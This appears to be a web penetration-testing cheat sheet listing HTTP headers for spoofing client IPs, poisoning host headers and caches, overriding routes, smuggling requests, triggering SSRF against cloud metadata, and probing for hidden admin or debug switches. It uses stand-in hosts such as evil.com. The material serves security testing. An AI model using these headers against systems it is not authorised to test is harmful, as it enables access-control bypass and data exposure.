A reference of HTTP headers that are useful for attacking, bypassing, fingerprinting, and understanding web application behaviour. Headers are grouped by what they're used for.

These headers tell the server the "real" client IP. If trusted without validation they allow IP-based access control bypass and rate limit evasion.

```
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 192.168.1.1, 10.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Host: localhost
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1        ← Cloudflare
Fastly-Client-IP: 127.0.0.1       ← Fastly CDN
X-Cluster-Client-IP: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
Via: 1.1 localhost
Forwarded: for=127.0.0.1
```

**Use cases:**

- Rate limit bypass (rotate these with Intruder Pitchfork)
- Access admin panels restricted to localhost
- Bypass IP allowlists

---

## Host Header Manipulation

```
Host: localhost
Host: internal.company.com
Host: 169.254.169.254              ← cloud metadata
Host: evil.com
Host: target.com:OASTIFY.COM      ← non-numeric port
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com
X-HTTP-Host-Override: evil.com
Forwarded: host=evil.com
```

**Use cases:**

- Password reset poisoning
- Routing-based SSRF
- Cache poisoning
- Bypass host header validation

---

## URL / Routing Override

```
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Override-URL: /admin
X-Forwarded-Path: /admin
X-Custom-IP-Authorization: 127.0.0.1
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE
_method=PATCH                      ← body param, not header
```

**Use cases:**

- Bypass path-based access control when front-end checks the path but back-end uses the override
- Access restricted endpoints (`/admin`, `/internal`)
- HTTP method override for SameSite CSRF bypass

---

## Cache Control & Poisoning

```
Cache-Control: no-cache
Cache-Control: no-store
Cache-Control: public, max-age=3600
Pragma: no-cache
Surrogate-Control: max-age=3600
Surrogate-Key: tag1 tag2           ← Fastly cache tag
X-Cache: HIT
X-Cache: MISS
X-Cache: dynamic
Age: 30                            ← seconds in cache
Vary: Accept-Encoding, Cookie      ← cache key components
Pragma: akamai-x-get-cache-key    ← reveal Akamai cache key
CDN-Cache-Control: max-age=600
Cloudflare-CDN-Cache-Control: max-age=600
CF-Cache-Status: HIT
```

**Use cases:**

- Identify cached vs dynamic responses
- Discover unkeyed headers for cache poisoning
- Bypass cache with unique cache busters

---

## Security Headers (Check for Missing)

These should be present — their absence is a finding:

```
Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=(), camera=()
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-origin
```

**Check with:** `curl -I https://target.com` or Burp passive scanner

---

## CORS Headers

```
Origin: https://evil.com           ← inject to test reflection
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Authorization, X-Custom
Access-Control-Expose-Headers: X-Secret-Header
Access-Control-Max-Age: 3600
Vary: Origin                       ← per-origin caching
```

**Dangerous combo:** `Allow-Origin: *` + `Allow-Credentials: true` (browsers block but signals misconfiguration)

---

## Authentication & Session

```
Authorization: Bearer TOKEN
Authorization: Basic BASE64
Authorization: Digest ...
Cookie: session=VALUE
Set-Cookie: session=VALUE; HttpOnly; Secure; SameSite=Strict
X-Auth-Token: TOKEN
X-API-Key: APIKEY
X-CSRF-Token: TOKEN
X-Request-With: XMLHttpRequest    ← some apps check this for CSRF protection
```

**Attack angles:**

- Remove `Authorization` header — does the endpoint still respond?
- Swap your token for another user's
- Check `SameSite`, `HttpOnly`, `Secure` cookie flags — missing = weaker protection

---

## Request Smuggling / HTTP Version

```
Transfer-Encoding: chunked
Transfer-Encoding: xchunked
Transfer-Encoding : chunked        ← space before colon
Content-Length: 0
Connection: keep-alive
Connection: close
Upgrade: h2c                       ← HTTP/2 cleartext upgrade
HTTP2-Settings: ...
```

---

## Information Disclosure Headers

These often reveal backend technology, framework version, or internal infrastructure:

```
Server: Apache/2.4.49              ← version fingerprinting
X-Powered-By: PHP/7.4.3
X-AspNet-Version: 4.0.30319
X-Generator: WordPress 6.1
X-Drupal-Cache: HIT
X-Varnish: 12345 67890
Via: 1.1 varnish (Varnish/6.5)
X-Backend-Server: internal-web-01
X-Served-By: cache-lhr1234-LHR
CF-Ray: 7a1b2c3d4e5f6a7b-LHR      ← Cloudflare ray ID
X-Request-ID: abc123               ← trace IDs, useful for correlating logs
X-Correlation-ID: abc123
X-Amzn-RequestId: abc123          ← AWS
X-Cache-Hits: 3
```

---

## SSRF-Related Headers

```
X-Forwarded-For: 169.254.169.254   ← cloud metadata
Referer: http://OASTIFY.COM        ← blind SSRF via Referer
Host: OASTIFY.COM                  ← routing SSRF
Location: http://internal/         ← follow redirects to internal
```

---

## WebSocket Headers

```
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: BASE64KEY==
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: chat
Sec-WebSocket-Extensions: permessage-deflate
Origin: https://target.com         ← check if validated
```

---

## Content Negotiation / Type Confusion

```
Content-Type: application/json
Content-Type: text/xml
Content-Type: application/xml
Content-Type: application/x-www-form-urlencoded
Content-Type: multipart/form-data
Accept: application/json
Accept: text/html
Accept: application/xml
Content-Encoding: gzip
Content-Encoding: deflate
```

**Attack angles:**

- Switch `Content-Type` from JSON to XML — may trigger XXE
- Switch from `application/json` to `application/x-www-form-urlencoded` — may bypass CSRF protection (GraphQL CSRF)
- Try different `Accept` types — may reveal alternate response formats with more data

---

## Useful Custom Headers to Always Try

When testing any endpoint, try adding these to see if they change behaviour:

```
X-Debug: true
X-Debug-Mode: 1
X-Test: true
X-Dev: 1
X-Admin: true
X-Internal: 1
X-Role: admin
X-User-ID: 1
X-User: admin
X-Override: true
X-Bypass: 1
debug=true
admin=true
```

---

## References

- [OWASP Secure Headers](https://owasp.org/www-project-secure-headers/)
- [MDN HTTP Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
- [PortSwigger HTTP Headers](https://portswigger.net/burp/documentation/desktop/http2)
- [SecLists HTTP Headers Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt)